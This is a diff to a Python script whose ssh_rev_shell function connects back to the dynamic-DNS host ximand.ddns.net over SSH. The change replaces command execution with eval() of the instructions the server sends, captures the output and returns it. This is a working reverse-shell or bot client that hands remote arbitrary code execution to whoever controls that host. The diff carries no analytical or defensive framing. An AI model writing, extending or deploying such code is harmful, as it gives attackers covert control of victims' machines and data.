@@ -7,6 +7,7 @@ import warnings
 warnings.filterwarnings("ignore")
 
 import os
+import io
 import sys
 import time
 import signal
@@ -49,7 +50,8 @@ def signal_handler(sig, frame):
 signal.signal(signal.SIGINT, signal_handler)
 
 
-def resolve_ip(domain_name):
+
+def dns_resolution(domain_name):
     try:
         
         ip_address = socket.gethostbyname(domain_name)
@@ -156,12 +158,16 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 
                         
                         try:
-                            response = exec_underlying_command(server_instructions)
+                            output = io.StringIO()
+                            sys.stdout = output  
+                            response = eval(server_instructions)
+                            sys.stdout = sys.__stdout__  
+                            response = output.getvalue() if output.getvalue() else str(response)  
                         except Exception as e:
                             response = f"Command failed:\t{e}"
 
                         ssh_session.send(response.encode())
-
+                        
 
                         
                         ssh_session.close()
@@ -192,7 +198,7 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
 if __name__ == "__main__":
 
     auth_path = os.path.join(parent_dir, 'mechanism')
-    host = resolve_ip('ximand.ddns.net')
+    host = dns_resolution('ximand.ddns.net')
 
     
     while True:
